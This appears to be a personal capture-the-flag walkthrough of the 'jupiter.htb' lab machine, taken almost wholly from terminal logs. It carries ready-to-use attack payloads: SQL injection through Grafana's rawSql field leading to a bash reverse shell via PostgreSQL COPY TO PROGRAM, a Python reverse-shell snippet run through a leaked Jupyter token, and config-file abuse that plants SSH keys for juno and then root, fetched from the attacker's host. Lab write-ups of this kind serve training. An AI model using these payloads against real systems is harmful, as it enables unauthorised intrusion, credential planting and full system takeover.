@@ -1,0 +1,460 @@
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.11.216/ -H "Host: FUZZ.jupiter.htb" --hh 178
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.216/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000001955:   200        211 L    798 W      34390 Ch    "kiosk"                                             
+
+Total time: 67.77157
+Processed Requests: 19966
+Filtered Requests: 19965
+Requests/sec.: 294.6072
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+an instance of Grafana
+
+as we scroll and intercept traffic we see
+
+POST /api/ds/query HTTP/1.1
+Host: kiosk.jupiter.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d
+content-type: application/json
+x-dashboard-uid: jMgFGfA4z
+x-datasource-uid: YItSLg-Vz
+x-grafana-org-id: 1
+x-panel-id: 6
+x-plugin-id: postgres
+Content-Length: 389
+Origin: http://kiosk.jupiter.htb
+Connection: keep-alive
+Priority: u=4
+
+{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = 'Earth';","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":460}],"range":{"from":"2025-12-10T12:32:35.249Z","to":"2025-12-10T18:32:35.249Z","raw":{"from":"now-6h","to":"now"}},"from":"1765369955249","to":"1765391555249"}
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# sqlmap -r jupiter.req --fresh-queries --batch --dbms postgresql --time-sec=1 --current-user --current-db --hostname --is-dba --privileges --dbs --tables 
+
+...
+database management system users privileges:
+[*] grafana_viewer (administrator) [1]:
+    privilege: super
+[*] postgres (administrator) [2]:
+    privilege: createdb
+    privilege: super
+
+
+given this injection point
+
+[13:36:18] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON rawSql ((custom) POST)
+    Type: inline query
+    Title: Generic inline queries
+    Payload: {"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"(SELECT CONCAT(CONCAT((CHR(113)||CHR(112)||CHR(98)||CHR(122)||CHR(113)),(CASE WHEN (8853=8853) THEN (CHR(49)) ELSE (CHR(48)) END)),(CHR(113)||CHR(98)||CHR(106)||CHR(118)||CHR(113))))","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":460}],"range":{"from":"2025-12-10T12:32:35.249Z","to":"2025-12-10T18:32:35.249Z","raw":{"from":"now-6h","to":"now"}},"from":"1765369955249","to":"1765391555249"}
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: {"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = 'Earth';;SELECT PG_SLEEP(1)--","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":460}],"range":{"from":"2025-12-10T12:32:35.249Z","to":"2025-12-10T18:32:35.249Z","raw":{"from":"now-6h","to":"now"}},"from":"1765369955249","to":"1765391555249"}
+
+
+our payload becomes
+
+"rawSql":"select count(parent) from moons where parent = 'Earth';COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.38/53 0>&1\"'",
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 53  
+listening on [any] 53 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.10.11.216] 45362
+bash: cannot set terminal process group (1602): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@jupiter:/var/lib/postgresql/14/main$ 
+
+
+we also could have used sqlmap's --os-shell 
+
+
+we wget pspy64 and let it run
+
+2025/12/10 18:48:01 CMD: UID=1000  PID=1946   | /bin/sh -c /home/juno/shadow-simulation.sh 
+2025/12/10 18:48:01 CMD: UID=1000  PID=1947   | /bin/bash /home/juno/shadow-simulation.sh 
+2025/12/10 18:48:01 CMD: UID=1000  PID=1948   | 
+2025/12/10 18:48:01 CMD: UID=1000  PID=1949   | 
+2025/12/10 18:48:01 CMD: UID=1000  PID=1952   | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 
+2025/12/10 18:48:01 CMD: UID=1000  PID=1953   | lscpu --online --parse=CPU,CORE,SOCKET,NODE 
+2025/12/10 18:48:01 CMD: UID=1000  PID=1958   | /usr/bin/python3 -m http.server 80 
+2025/12/10 18:48:01 CMD: UID=1000  PID=1959   | /usr/bin/curl -s server 
+2025/12/10 18:48:01 CMD: UID=1000  PID=1961   | /usr/bin/curl -s server 
+2025/12/10 18:48:01 CMD: UID=1000  PID=1963   | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 
+2025/12/10 18:48:01 CMD: UID=1000  PID=1968   | 
+
+
+we dont have access to any home directories
+
+postgres@jupiter:/var/tmp$ cat /dev/shm/network-simulation.yml 
+general:
+  # stop after 10 simulated seconds
+  stop_time: 10s
+  # old versions of cURL use a busy loop, so to avoid spinning in this busy
+  # loop indefinitely, we add a system call latency to advance the simulated
+  # time when running non-blocking system calls
+  model_unblocked_syscall_latency: true
+
+network:
+  graph:
+    # use a built-in network graph containing
+    # a single vertex with a bandwidth of 1 Gbit
+    type: 1_gbit_switch
+
+hosts:
+  # a host with the hostname 'server'
+  server:
+    network_node_id: 0
+    processes:
+    - path: /usr/bin/python3
+      args: -m http.server 80
+      start_time: 3s
+  # three hosts with hostnames 'client1', 'client2', and 'client3'
+  client:
+    network_node_id: 0
+    quantity: 3
+    processes:
+    - path: /usr/bin/curl
+      args: -s server
+      start_time: 5s
+postgres@jupiter:/var/tmp$ 
+
+
+
+postgres@jupiter:/var/tmp$ ls -lsa /dev/shm/network-simulation.yml 
+4 -rw-rw-rw- 1 juno juno 815 Mar  7  2023 /dev/shm/network-simulation.yml
+
+
+after a couple tries, it becomes apparent that anything beyond the /usr/bin directory may not run properly or be sandboxed.
+we see the commands being ran through pspy, but no /bin/bash or /bin/sh payload works properly.
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh-keygen -f juno -b 1024
+Generating public/private ed25519 key pair.
+Enter passphrase for "juno" (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in juno
+Your public key has been saved in juno.pub
+The key fingerprint is:
+SHA256:INvRQpEhAaesQMmJwniY3yM1Kyv9qGfRO4/I+q9djSE root@kali
+The key's randomart image is:
++--[ED25519 256]--+
+|=++.+.++         |
+|B*.ooo..         |
+|oooo.o+ .        |
+|..+ ++ +         |
+|.. =E.o S        |
+|. + .. +         |
+| . + .o .        |
+| .+o+o           |
+|o*=o+o.          |
++----[SHA256]-----+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat juno.pub 
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGMf+svm/q4bhc6i5O+HXM0TNWJKIBkEC1P87/EtKnR7 root@kali
+
+
+
+
+postgres@jupiter:/dev/shm$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGMf+svm/q4bhc6i5O+HXM0TNWJKIBkEC1P87/EtKnR7 root@kali" > /dev/shm/authorized_keys
+postgres@jupiter:/dev/shm$ chmod 644 /dev/shm/authorized_keys
+
+
+
+we change the file contents
+
+  # three hosts with hostnames 'client1', 'client2', and 'client3'
+  client:
+    network_node_id: 0
+    quantity: 3
+    processes:
+    - path: /usr/bin/cp
+      args: "/dev/shm/authorized_keys /home/juno/.ssh"
+      start_time: 1s
+postgres@jupiter:/dev/shm$ 
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -i juno juno@10.10.11.216
+...
+juno@jupiter:~$ 
+
+juno@jupiter:~$ id
+uid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science)
+
+juno@jupiter:~$ find / -group science 2>/dev/null
+/opt/solar-flares
+/opt/solar-flares/flares.csv
+/opt/solar-flares/xflares.csv
+/opt/solar-flares/map.jpg
+/opt/solar-flares/start.sh
+/opt/solar-flares/logs
+/opt/solar-flares/logs/jupyter-2023-03-10-25.log
+/opt/solar-flares/logs/jupyter-2023-03-08-37.log
+/opt/solar-flares/logs/jupyter-2023-03-08-38.log
+/opt/solar-flares/logs/jupyter-2023-03-08-36.log
+/opt/solar-flares/logs/jupyter-2023-03-09-11.log
+/opt/solar-flares/logs/jupyter-2023-03-09-24.log
+/opt/solar-flares/logs/jupyter-2023-03-08-14.log
+/opt/solar-flares/logs/jupyter-2023-03-09-59.log
+/opt/solar-flares/flares.html
+/opt/solar-flares/cflares.csv
+/opt/solar-flares/flares.ipynb
+/opt/solar-flares/.ipynb_checkpoints
+/opt/solar-flares/mflares.csv
+juno@jupiter:~$ 
+
+
+
+juno@jupiter:~$ cat /opt/solar-flares/logs/jupyter-2023-03-08-38.log
+[W 11:38:29.716 NotebookApp] Terminals not available (error was No module named 'terminado')
+[I 11:38:29.722 NotebookApp] Serving notebooks from local directory: /opt/solar-flares
+[I 11:38:29.722 NotebookApp] Jupyter Notebook 6.5.3 is running at:
+[I 11:38:29.722 NotebookApp] http://localhost:8888/?token=355e8d17288e32971e13b7ea0e5a45f610a89a1079935d70
+[I 11:38:29.722 NotebookApp]  or http://127.0.0.1:8888/?token=355e8d17288e32971e13b7ea0e5a45f610a89a1079935d70
+[I 11:38:29.722 NotebookApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
+[W 11:38:29.724 NotebookApp] No web browser found: could not locate runnable browser.
+[C 11:38:29.724 NotebookApp] 
+    
+    To access the notebook, open this file in a browser:
+        file:///home/jovian/.local/share/jupyter/runtime/nbserver-872-open.html
+    Or copy and paste one of these URLs:
+        http://localhost:8888/?token=355e8d17288e32971e13b7ea0e5a45f610a89a1079935d70
+     or http://127.0.0.1:8888/?token=355e8d17288e32971e13b7ea0e5a45f610a89a1079935d70
+
+
+juno@jupiter:~$ netstat -tunlp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -   
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -D 9999 -i juno juno@10.10.11.216
+
+then setup foxyproxy
+socks5 127.0.0.1 and port 9999
+
+we then use the link within one of the most recent logs to get in
+
+
+we create a run within a cell
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.38",53))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/bash","-i"])
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 53
+listening on [any] 53 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.10.11.216] 44196
+bash: cannot set terminal process group (4551): Inappropriate ioctl for device
+bash: no job control in this shell
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+jovian@jupiter:/opt/solar-flares$ 
+
+jovian@jupiter:/opt/solar-flares$ sudo -l
+sudo -l
+Matching Defaults entries for jovian on jupiter:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User jovian may run the following commands on jupiter:
+    (ALL) NOPASSWD: /usr/local/bin/sattrack
+jovian@jupiter:/opt/solar-flares$ 
+
+
+
+jovian@jupiter:/opt/solar-flares$ find / -name sattrack -type d 2>/dev/null
+find / -name sattrack -type d 2>/dev/null
+/usr/local/share/sattrack
+
+jovian@jupiter:/tmp$ ls -lsa /usr/local/share/sattrack
+ls -lsa /usr/local/share/sattrack
+total 15408
+    4 drwxr-xr-x 2 root root     4096 May  4  2023 .
+    4 drwxr-xr-x 9 root root     4096 May  4  2023 ..
+    4 -rw-r--r-- 1 root root      610 Mar  8  2023 config.json
+15092 -rw-r--r-- 1 root root 15451549 Mar  8  2023 earth.png
+  304 -rw-r--r-- 1 root root   308117 Mar  8  2023 map.json
+jovian@jupiter:/tmp$ 
+
+
+jovian@jupiter:/opt/solar-flares$ sudo /usr/local/bin/sattrack
+sudo /usr/local/bin/sattrack
+Satellite Tracking System
+Configuration file has not been found. Please try again!
+
+
+jovian@jupiter:/opt/solar-flares$ strings /usr/local/bin/sattrack | grep config
+strings /usr/local/bin/sattrack | grep config
+/tmp/config.json
+...
+
+
+jovian@jupiter:/tmp$ ls -lsa /usr/local/share/sattrack
+ls -lsa /usr/local/share/sattrack
+total 15408
+    4 drwxr-xr-x 2 root root     4096 May  4  2023 .
+    4 drwxr-xr-x 9 root root     4096 May  4  2023 ..
+    4 -rw-r--r-- 1 root root      610 Mar  8  2023 config.json
+15092 -rw-r--r-- 1 root root 15451549 Mar  8  2023 earth.png
+  304 -rw-r--r-- 1 root root   308117 Mar  8  2023 map.json
+jovian@jupiter:/tmp$ cp /usr/local/share/sattrack/* .    
+cp /usr/local/share/sattrack/* .
+jovian@jupiter:/tmp$ sudo /usr/local/bin/sattrack
+sudo /usr/local/bin/sattrack
+Satellite Tracking System
+tleroot does not exist, creating it: /tmp/tle/
+Get:0 http://celestrak.org/NORAD/elements/weather.txt
+Could not resolve host: celestrak.org
+Get:0 http://celestrak.org/NORAD/elements/noaa.txt
+Could not resolve host: celestrak.org
+Get:0 http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle
+Could not resolve host: celestrak.org
+Satellites loaded
+No sats
+jovian@jupiter:/tm                  
+
+jovian@jupiter:/tmp$ cat config.json
+cat config.json
+{
+	"tleroot": "/tmp/tle/",
+	"tlefile": "weather.txt",
+	"mapfile": "/usr/local/share/sattrack/map.json",
+	"texturefile": "/usr/local/share/sattrack/earth.png",
+	
+	"tlesources": [
+		"http://celestrak.org/NORAD/elements/weather.txt",
+		"http://celestrak.org/NORAD/elements/noaa.txt",
+		"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"
+	],
+...
+jovian@jupiter:/tmp$ 
+
+
+
+
+we change config
+
+jovian@jupiter:/tmp$ cat config.json 
+{
+	"tleroot": "/root/.ssh",
+	"tlefile": "authorized_keys",
+	"mapfile": "/usr/local/share/sattrack/map.json",
+	"texturefile": "/usr/local/share/sattrack/earth.png",
+	
+	"tlesources": [
+		"http://10.10.14.38/authorized_keys",
+		"http://celestrak.org/NORAD/elements/weather.txt",
+		"http://celestrak.org/NORAD/elements/noaa.txt",
+		"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"
+	],
+...
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh-keygen -f juno -b 1024         
+...
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cp juno.pub authorized_keys   
+
+
+jovian@jupiter:/tmp$ sudo /usr/local/bin/sattrack
+Satellite Tracking System
+Get:0 http://10.10.14.38/authorized_keys
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -i juno root@10.10.11.216
+Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Dec 10 09:45:26 PM UTC 2025
+
+  System load:           0.00048828125
+  Usage of /:            81.5% of 12.33GB
+  Memory usage:          24%
+  Swap usage:            0%
+  Processes:             232
+  Users logged in:       1
+  IPv4 address for eth0: 10.10.11.216
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:880c
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+root@jupiter:~# 
+
